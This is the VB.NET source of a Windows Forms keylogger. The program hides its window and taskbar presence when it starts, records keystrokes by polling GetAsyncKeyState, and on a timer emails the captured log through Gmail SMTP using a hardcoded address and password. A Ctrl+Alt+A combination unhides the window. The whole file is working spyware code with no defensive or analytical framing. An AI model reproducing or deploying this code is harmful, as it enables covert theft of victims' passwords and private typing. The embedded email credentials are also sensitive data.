Option Strict On

Imports System.Net.Mail

Public Class Form1
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Short
    Private Sub emailTimer_Tick(sender As Object, e As EventArgs) Handles emailTimer.Tick
        Try
            Dim smptser As New SmtpClient
            smptser.EnableSsl = True
            smptser.Credentials = New Net.NetworkCredential("keyloggertestemail1@gmail.com", "keylogger007")
            smptser.Port = 587
            smptser.Host = "smtp.gmail.com"

            Dim email As New MailMessage
            email.From = New MailAddress("keyloggertestemail1@gmail.com", "kl")
            email.To.Add("keyloggertestemail1@gmail.com")
            email.Subject = ("keylogging data")
            email.Body = logs.Text
            smptser.Send(email)

        Catch ex As Exception
            Me.Close()
        End Try
    End Sub

    Private Sub keyTimer_Tick(sender As Object, e As EventArgs) Handles keyTimer.Tick
        Dim result As Integer
        Dim i As Integer
        Dim key As String

        For i = 2 To 90
            result = 0
            result = GetAsyncKeyState(i)

            If result = -32767 Then
                key = Chr(i)
                If i = 13 Then key = vbNewLine
                Exit For
            End If
        Next

        If key <> Nothing Then
            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                logs.Text &= key
            Else
                logs.Text &= key.ToLower
            End If
        End If


        If My.Computer.Keyboard.AltKeyDown AndAlso My.Computer.Keyboard.CtrlKeyDown AndAlso key = "A" Then
            Me.Visible = True
        End If
    End Sub

    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        logs.Text &= vbNewLine & "Stopped: " & Now & vbNewLine
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Visible = False
        logs.Text &= vbNewLine & "Started: " & Now & vbNewLine
    End Sub
End Class
